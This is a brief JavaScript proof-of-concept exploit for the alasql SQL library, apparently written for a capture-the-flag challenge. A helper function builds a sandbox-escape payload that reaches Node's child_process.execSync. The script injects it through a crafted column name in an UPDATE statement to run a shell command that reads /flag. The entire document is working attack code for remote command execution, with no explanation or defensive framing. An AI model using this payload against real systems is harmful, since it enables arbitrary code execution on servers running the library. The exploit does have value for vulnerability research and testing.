const genPayload = command => `
new Function(
    'return this.process.mainModule.require'
)()('child_process').execSync(${JSON.stringify(command)})
`;


alasql("CREATE table test");
alasql("INSERT INTO test VALUES (1337)");
alasql("UPDATE test SET [0'+${genPayload(">&2 echo UPDATE pwned $(/flag)")}+']=42");
